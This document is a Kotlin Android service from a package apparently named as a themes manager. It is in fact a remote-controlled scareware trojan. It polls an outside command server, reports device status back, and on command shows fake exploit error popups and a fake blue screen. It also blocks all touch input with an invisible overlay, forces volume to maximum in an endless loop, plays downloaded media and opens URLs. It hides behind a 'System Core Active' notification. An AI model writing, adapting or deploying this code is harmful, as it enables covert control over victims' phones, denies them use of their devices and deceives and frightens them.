package com.themes.manager

import android.app.*
import android.content.*
import android.graphics.Color
import android.graphics.PixelFormat
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import android.view.*
import android.widget.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.*
import java.net.URL
import android.graphics.Point
import android.graphics.Typeface
import android.media.AudioManager
import android.media.MediaPlayer
import android.speech.tts.TextToSpeech
import java.util.Locale
import android.view.View
import android.view.WindowManager



class VisualService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient()
    private val serverUrl = "https://ms32-sha2.onrender.com/"
    private val user = "104LXG"
    private var blockerView: View? = null
    private var lastCommand: String? = null
    private val errorPopups = mutableListOf<View>()
    private var blueOverlayView: View? = null
    private var messageTextView: TextView? = null
    private var speakDisplayRunning = false
    private var tts: TextToSpeech? = null
    private var flipRunning = false
    private var currentOrientation = "portrait"

    private lateinit var wm: WindowManager

    override fun onCreate() {
        super.onCreate()
        if (!Settings.canDrawOverlays(this)) {
            openOverlaySettings()
            stopSelf()
            return
        }

        createNotificationChannel()
        startForeground(1, buildSilentNotification())
        keepVolumeFull()
        tts = TextToSpeech(this) { status ->
            if (status == TextToSpeech.SUCCESS) {
                tts?.language = Locale.US

                val voices = tts?.voices
                val maleVoice = voices?.find {
                    it.locale == Locale.US && !it.isNetworkConnectionRequired &&
                            it.name.contains("male", ignoreCase = true)
                }

                if (maleVoice != null) {
                    tts?.voice = maleVoice
                    Log.d("MS32", "Using male voice: ${maleVoice.name}")
                } else {
                    Log.d("MS32", "Male voice not found, using default.")
                }
            }
        }


        wm = getSystemService(WINDOW_SERVICE) as WindowManager
        scope.launch { pollForCommands() }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    private fun keepVolumeFull() {
        Thread {
            val audioManager = getSystemService(AUDIO_SERVICE) as AudioManager
            while (true) {
                val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0)
                Thread.sleep(2000) // Check every 2 seconds
            }
        }.start()
    }

    private fun openOverlaySettings() {
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
            data = Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    private suspend fun pollForCommands() {
        log("$user online",state="ONLINE")
        while (true) {
            try {
                val json = JSONObject().put("user", user)
                val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder().url("$serverUrl/command").post(body).build()
                val response = client.newCall(request).execute()
                val command = response.body?.string()?.trim() ?: ""
                if (command == lastCommand || command.isEmpty()) {
                    delay(1000)
                    continue
                }
                lastCommand = command

                when {
                    command.startsWith("iMaGe ") -> {
                        val filename = command.removePrefix("iMaGe ").trim()
                        showImageOverlay(filename)
                    }
                    command.startsWith("pLaY ") -> {
                        val filename = command.removePrefix("pLaY ").trim()
                        playSound(filename)
                    }
                    command.startsWith("sPeAk") -> {
                        val text = command.removePrefix("sPeAk").trim()
                        withContext(Dispatchers.Main) {
                            Toast.makeText(this@VisualService, text, Toast.LENGTH_LONG).show()
                        }
                        speakText(text)
                    }
                    command.equals("fLiP on", true) -> {
                        withContext(Dispatchers.Main) { startFlipLoop() }
                    }
                    command.equals("fLiP off", true) -> {
                        withContext(Dispatchers.Main) { stopFlipLoop() }
                    }
                    command.startsWith("vIdEo ") -> {
                        val filename = command.removePrefix("vIdEo ").trim()
                        showVideoOverlay(filename)
                    }
                    command.startsWith("oPeN ") -> {
                        val url = command.removePrefix("oPeN ").trim()
                        openWebsite(url)
                    }
                    command.equals("bLoCk on") -> {
                        showBlockOverlay()
                    }
                    command.equals("bLoCk off") -> {
                        removeBlockOverlay()
                    }
                    command.lowercase().startsWith("err ") -> {
                        val count = command.removePrefix("eRr ").trim().toIntOrNull() ?: 1
                        showErrorPopups(count)
                    }
                    command.equals("rUn speakdisplay.exe", true) -> {
                        withContext(Dispatchers.Main) {
                            showBlueScreenOverlay()
                        }
                    }
                }
            } catch (e: Exception) {
                log("Poll error: $e",state="WARN")
            }
            delay(1000)
        }
    }
    private fun speakText(text: String) {
        scope.launch(Dispatchers.IO) {
            try {
                val json = JSONObject().put("text", text)
                val body = json.toString()
                    .toRequestBody("application/json".toMediaTypeOrNull())

                val request = Request.Builder()
                    .url("https://ms32-sha2.onrender.com/tts")
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.d("TTS", "TTS response failed: ${response.code}")
                        return@use
                    }

                    val inputStream = response.body?.byteStream() ?: return@use
                    val tmpFile = File.createTempFile("tts_audio", ".mp3", cacheDir)
                    tmpFile.outputStream().use { fileOut ->
                        inputStream.copyTo(fileOut)
                    }

                    withContext(Dispatchers.Main) {
                        Toast.makeText(this@VisualService, "Speaking: $text", Toast.LENGTH_LONG).show()
                        log("Toast created with: $text")
                        try {
                            val mediaPlayer = MediaPlayer().apply {
                                setDataSource(tmpFile.absolutePath)
                                setAudioStreamType(AudioManager.STREAM_MUSIC)
                                prepare()
                                start()
                            }

                            mediaPlayer.setOnCompletionListener {
                                it.release()
                                tmpFile.delete()
                                log("Spoken $text")
                            }
                        } catch (e: Exception) {
                            Log.d("TTS", "MediaPlayer error: $e")
                            tmpFile.delete()
                        }
                    }
                }
            } catch (e: Exception) {
                log("TTS error: $e",state="WARN")
            }
        }
    }


    private fun startFlipLoop() {
        if (flipRunning) return
        flipRunning = true

        scope.launch(Dispatchers.Main) {
            log("Flipping da screen")
            while (flipRunning) {
                currentOrientation = if (currentOrientation == "portrait") "landscape" else "portrait"

                val intent = Intent(this@VisualService, DummyFlipActivity::class.java).apply {
                    putExtra("force", currentOrientation)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)

                delay(1200)
            }
        }
    }
    private fun stopFlipLoop() {
        flipRunning = false
        log("Unflipping da screen")
    }

    private fun playSound(filename: String) {
        scope.launch(Dispatchers.IO) {
            try {
                val audioFile = getOrDownloadFile(filename, "sounds") ?: return@launch

                val mediaPlayer = MediaPlayer().apply {
                    setDataSource(audioFile.absolutePath)
                    setAudioStreamType(AudioManager.STREAM_MUSIC)
                    prepare()
                    start()
                }

                mediaPlayer.setOnCompletionListener {
                    it.release()
                    log("$filename played")
                }

            } catch (e: Exception) {
                log("Audio playback error: $e",state="WARN")
            }
        }
    }

    private suspend fun showErrorPopups(count: Int) = withContext(Dispatchers.Main) {
        log("Deploying $count errors",state="PENDING")
        repeat(count) {
            val popupLayout = LinearLayout(this@VisualService).apply {
                orientation = LinearLayout.VERTICAL
                setBackgroundColor(Color.WHITE)
                setPadding(0, 0, 0, 0)
            }

            val titleBar = LinearLayout(this@VisualService).apply {
                orientation = LinearLayout.HORIZONTAL
                setBackgroundColor(Color.parseColor("#003399"))
                setPadding(16, 8, 16, 8)
                gravity = Gravity.CENTER_VERTICAL
            }

            val errorIcon = TextView(this@VisualService).apply {
                text = "\u26A0"
                textSize = 24f
                setTextColor(Color.WHITE)
            }

            val titleText = TextView(this@VisualService).apply {
                text = "  Error"
                textSize = 20f
                setTextColor(Color.WHITE)
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val closeButton = Button(this@VisualService).apply {
                text = "X"
                textSize = 18f
                setTextColor(Color.WHITE)
                setBackgroundColor(Color.TRANSPARENT)
            }

            titleBar.addView(errorIcon, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ))
            titleBar.addView(titleText)
            titleBar.addView(closeButton, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ))

            popupLayout.addView(titleBar)

            val contentText = TextView(this@VisualService).apply {
                text = "MS32 exploit compromises system integrity at ring 0."
                textSize = 18f
                setTextColor(Color.BLACK)
                setPadding(16, 16, 16, 16)
            }
            popupLayout.addView(contentText)

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                android.graphics.PixelFormat.TRANSLUCENT

            )

            val display = wm.defaultDisplay
            val size = android.graphics.Point().also { display.getSize(it) }
            params.x = (-size.x / 4..size.x / 4).random()
            params.y = (-size.y / 4..size.y / 4).random()

            try {
                wm.addView(popupLayout, params)
                errorPopups.add(popupLayout)
            } catch (e: Exception) {
                log("Popup error: $e",state="WARN")
            }

            closeButton.setOnClickListener {
                try {
                    wm.removeView(popupLayout)
                    errorPopups.remove(popupLayout)
                } catch (e: Exception) {
                    Log.d("MS32", "Error removing popup: $e")
                }
            }
        }
        log("Deployed $count errors")
    }

    private suspend fun showBlockOverlay() = withContext(Dispatchers.Main) {
        if (blockerView != null) return@withContext

        blockerView = View(this@VisualService).apply {
            setBackgroundColor(Color.argb(0, 0, 0, 0))
            setOnTouchListener { _, _ -> true }
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )

        try {
            wm.addView(blockerView, params)
            log("Inputblock alive")
        } catch (e: Exception) {
            log("Error adding overlay: $e",state="WARN")
        }
    }
    private suspend fun removeBlockOverlay() = withContext(Dispatchers.Main) {
        try {
            blockerView?.let {
                wm.removeView(it)
                log("Inputblock overlay removed")
            }
            blockerView = null
        } catch (e: Exception) {
            log("Error removing overlay: $e",state="WARN")
        }
    }

    private fun openWebsite(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            log("Url opening request sent")
        } catch (e: Exception) {
            log("Failed to open URL: $e",state="WARN")
        }
    }

    private fun showImageOverlay(filename: String) {
        scope.launch(Dispatchers.IO) {
            log("Showing $filename",state="PENDING")
            try {
                val imageFile = getOrDownloadFile(filename, "images") ?: return@launch

                val imageView = ImageView(this@VisualService).apply {
                    setImageURI(Uri.fromFile(imageFile))
                    scaleType = ImageView.ScaleType.FIT_CENTER
                    adjustViewBounds = true
                }

                // FrameLayout with black background
                val container = FrameLayout(this@VisualService).apply {
                    setBackgroundColor(Color.BLACK)
                    addView(imageView, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        Gravity.CENTER
                    ))
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
                )

                withContext(Dispatchers.Main) {
                    try {
                        wm.addView(container, params)
                        log("Showing $filename")
                    } catch (e: Exception) {
                        log("Image overlay UI error: $e",state="WARN")
                    }
                }
                delay(10000)
                withContext(Dispatchers.Main) {
                    try {
                        wm.removeView(container)
                    } catch (_: Exception) {}
                }
            } catch (e: Exception) {
                log("Image overlay error: $e",state="WARN")
            }
        }
    }

    private fun showVideoOverlay(filename: String) {
        scope.launch(Dispatchers.IO) {
            log("Showing $filename",state="PENDING")
            try {
                val videoFile = getOrDownloadFile(filename, "videos") ?: return@launch

                val videoView = VideoView(this@VisualService).apply {
                    setVideoPath(videoFile.absolutePath)
                    setZOrderOnTop(true)
                    layoutParams = FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.WRAP_CONTENT,
                        FrameLayout.LayoutParams.WRAP_CONTENT,
                        Gravity.CENTER
                    )
                }

                // Parent layout with black background
                val container = FrameLayout(this@VisualService).apply {
                    setBackgroundColor(Color.BLACK)
                    addView(videoView)
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
                )

                withContext(Dispatchers.Main) {
                    try {
                        wm.addView(container, params)

                        videoView.setOnPreparedListener { mp ->
                            // Fit video proportionally
                            val videoWidth = mp.videoWidth
                            val videoHeight = mp.videoHeight
                            val display = wm.defaultDisplay
                            val size = Point()
                            display.getSize(size)
                            val screenWidth = size.x
                            val screenHeight = size.y

                            val videoRatio = videoWidth.toFloat() / videoHeight
                            val screenRatio = screenWidth.toFloat() / screenHeight

                            if (videoRatio > screenRatio) {
                                // Video is wider than screen
                                val newHeight = (screenWidth / videoRatio).toInt()
                                videoView.layoutParams = FrameLayout.LayoutParams(
                                    FrameLayout.LayoutParams.MATCH_PARENT,
                                    newHeight,
                                    Gravity.CENTER
                                )
                            } else {
                                // Video is taller than screen
                                val newWidth = (screenHeight * videoRatio).toInt()
                                videoView.layoutParams = FrameLayout.LayoutParams(
                                    newWidth,
                                    FrameLayout.LayoutParams.MATCH_PARENT,
                                    Gravity.CENTER
                                )
                            }

                            mp.setAudioStreamType(android.media.AudioManager.STREAM_MUSIC)
                            videoView.start()
                        }

                        videoView.setOnCompletionListener {
                            log("$filename display completed")
                            scope.launch(Dispatchers.Main) {
                                try {
                                    videoView.stopPlayback()
                                    wm.removeView(container)
                                } catch (_: Exception) {}
                            }
                        }

                    } catch (e: Exception) {
                        log("Video overlay UI error: $e",state="WARN")
                    }
                }
            } catch (e: Exception) {
                log("Video Function error: $e",state="WARN")
            }
        }
    }

    private fun getOrDownloadFile(filename: String, folder: String): File? {
        return try {
            log("Downloading $filename",state="PENDING")
            val dir = File(getExternalFilesDir(null), folder)
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, filename)
            if (!file.exists()) {
                val url = URL("$serverUrl/static/$folder/$filename")
                url.openStream().use { input ->
                    FileOutputStream(file).use { output ->
                        input.copyTo(output)
                        log("Downloaded $filename")
                    }
                }
            }
            file
        } catch (e: Exception) {
            log("Download failed: $e",state="WARN")
            null
        }
    }
    private fun showBlueScreenOverlay() {
        if (speakDisplayRunning) return
        speakDisplayRunning = true

        val layout = LinearLayout(this).apply {
            setBackgroundColor(Color.BLUE)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            gravity = Gravity.TOP or Gravity.START
            orientation = LinearLayout.VERTICAL
            setPadding(40, 100, 40, 100)
        }

        val message = TextView(this).apply {
            setTextColor(Color.WHITE)
            textSize = 28f
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.START
            setLineSpacing(1.2f, 1.2f)
        }

        layout.addView(message)
        messageTextView = message
        blueOverlayView = layout

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT
        )

        wm.addView(layout, params)

        scope.launch { blueScreenMessageLoop() }
    }

    private suspend fun typeMessageAnimated(text: String) {
        val tv = messageTextView ?: return
        val formatted = formatMessage(text, maxLineLength = 40)

        var current = ""
        for (c in formatted) {
            current += c
            withContext(Dispatchers.Main) {
                tv.text = current + "_"
            }
            delay(70)
        }

        // Blink the cursor 6 times
        repeat(6) {
            withContext(Dispatchers.Main) {
                tv.text = current + if (it % 2 == 0) "_" else ""
            }
            delay(500)
        }
        withContext(Dispatchers.Main) {
            tv.text = current
        }
    }

    private fun formatMessage(message: String, maxLineLength: Int): String {
        val words = message.split(" ")
        val builder = StringBuilder()
        var line = ""
        for (word in words) {
            if (line.length + word.length + 1 <= maxLineLength) {
                if (line.isNotEmpty()) line += " "
                line += word
            } else {
                builder.append(line).append("\n")
                line = word
            }
        }
        if (line.isNotEmpty()) builder.append(line)
        return builder.toString()
    }


    private suspend fun blueScreenMessageLoop() {
        var lastMessage = ""
        var firstRun = true

        while (speakDisplayRunning) {
            try {
                val req = Request.Builder().url("${serverUrl}get-com").build()
                val res = client.newCall(req).execute()
                val msg = res.body?.string()?.trim() ?: ""

                if (msg.isEmpty() || msg.equals("none", ignoreCase = true)) {
                    delay(2000)
                    continue
                }

                if (msg == "dEsTrUcT") {
                    if (firstRun) {
                        firstRun = false
                        delay(2000)
                        continue
                    }
                    withContext(Dispatchers.Main) { destroyBlueScreenOverlay() }
                    return
                }

                firstRun = false
                typeMessageAnimated(msg)

            } catch (e: Exception) {
                Log.d("MS32", "Fetch error: $e")
            }

            delay(5000)
        }
    }


    private fun destroyBlueScreenOverlay() {
        speakDisplayRunning = false
        try {
            blueOverlayView?.let { wm.removeView(it) }
            blueOverlayView = null
            messageTextView = null
        } catch (_: Exception) {}
    }


    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                "vis_channel",
                "Visual Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            val mgr = getSystemService(NotificationManager::class.java)
            mgr?.createNotificationChannel(chan)
        }
    }
    private fun log(statement: String, state: String = "SUCESS", terminal: Boolean = false) {
        try {
            val tagged = "$state   $statement"
            if (terminal) {
                val termJson = JSONObject().put("output", tagged)
                val body = termJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val req = Request.Builder().url(serverUrl + "terminal").post(body).build()
                client.newCall(req).execute()
            }

            val logJson = JSONObject().put("user", user).put("err", tagged)
            val body = logJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val req = Request.Builder().url(serverUrl + "output").post(body).build()
            client.newCall(req).execute()
            Log.d("MS32",statement)
        } catch (_: Exception) {}
        
    }
    private fun buildSilentNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "vis_channel")
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this).setPriority(Notification.PRIORITY_LOW)
        }

        return builder
            .setContentTitle("System Core Active")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setOngoing(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }
}